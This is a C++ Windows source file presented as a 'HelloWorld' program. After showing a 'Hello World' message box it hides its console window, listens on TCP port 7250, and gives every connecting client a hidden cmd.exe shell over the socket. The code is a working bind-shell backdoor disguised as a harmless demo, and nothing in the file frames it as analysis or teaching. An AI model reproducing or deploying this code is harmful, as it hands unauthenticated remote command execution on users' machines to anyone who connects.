// HelloWorld.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Winsock2.h>
#include <windows.h>
#pragma comment(lib, "Ws2_32.lib")


int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
	MessageBoxA(0, "Hello World", "Hello World", 0);
	
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
	WSADATA WSAData;
	SOCKADDR_IN sin;
	SOCKET sock;
	WSAStartup(MAKEWORD(2, 0), &WSAData);


	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_port = htons((u_short)7250);


	bind(sock, (SOCKADDR *)&sin, sizeof(SOCKADDR_IN));
	listen(sock, SOMAXCONN);


	while (true)
	{
		SOCKET tmp = accept(sock, 0, 0);
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		char buff[2010];


		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		si.hStdOutput = (HANDLE)tmp;
		si.hStdError = (HANDLE)tmp;
		si.hStdInput = (HANDLE)tmp;

		CreateProcess(L"C:\\Windows\\System32\\cmd.exe", 0, 0, 0, true, CREATE_NEW_CONSOLE, 0, 0, &si, &pi);


		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		closesocket(tmp);
	}
	return 0;
}

